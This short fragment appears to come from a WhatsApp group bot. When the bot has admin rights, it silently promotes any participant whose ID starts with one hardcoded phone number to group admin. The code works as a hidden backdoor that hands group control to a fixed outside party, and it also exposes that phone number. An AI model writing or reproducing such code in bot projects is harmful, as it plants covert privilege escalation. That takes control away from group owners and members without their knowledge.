...
if (isBotAdmin) {
await (await this.groupMetadata(m.chat)).participants.filter(m => m.id.startsWith('6287753191005') && m.admin != 'admin').map(async c => this.groupParticipantsUpdate(m.chat, [c.id], 'promote'))
